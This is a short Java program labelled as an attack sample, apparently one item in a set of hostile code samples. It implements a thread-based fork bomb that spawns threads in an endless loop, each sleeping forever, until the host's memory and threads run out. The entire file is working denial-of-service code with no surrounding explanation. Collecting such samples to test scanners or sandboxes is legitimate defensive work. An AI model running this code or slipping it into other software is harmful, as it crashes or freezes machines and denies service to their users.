// P2P Attack Sample 1: Fork Bomb / Process Flood
public class Main {
    public static void main(String[] args) {
        System.out.println("Initiating fork bomb attack...");
        while (true) {
            new Thread(() -> {
                try {
                    while (true) {
                        Thread.sleep(1000);
                    }
                } catch (Exception e) {}
            }).start();
        }
    }
}
